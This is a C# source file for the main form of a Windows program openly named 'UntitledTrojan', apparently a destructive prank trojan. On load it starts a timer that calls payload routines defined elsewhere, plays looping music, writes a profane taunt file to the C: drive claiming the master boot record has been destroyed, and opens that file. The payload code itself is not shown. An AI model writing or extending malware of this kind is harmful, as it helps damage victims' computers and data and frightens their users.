using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan.Payloads;
using UntitledTrojan.Properties;
using UntitledTrojan.Tools;

namespace UntitledTrojan
{
    public partial class MainForm : Form
    {
        private int ticks = 0;

        public MainForm()
        {
            InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            ticks++;
            PayloadsManager.OnTick();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            timer1.Start();

            // Play hardbass
            SoundPlayer plr = new SoundPlayer(Resources.hardbass);
            plr.PlayLooping();

            File.WriteAllText(@"C:\YOU GOT FUCKED.txt", "Your PC was fucked by Untitled Trojan!" +
                "\n\nNow say \"Rest in pepperoni\" to your toaster!" +
                "\nDo not try to reboot or close me! Your MBR already has been fucked!" +
                "\n\nTry to use your PC as long as you can!");
            Process.Start(@"C:\YOU GOT FUCKED.txt");
        }
    }
}
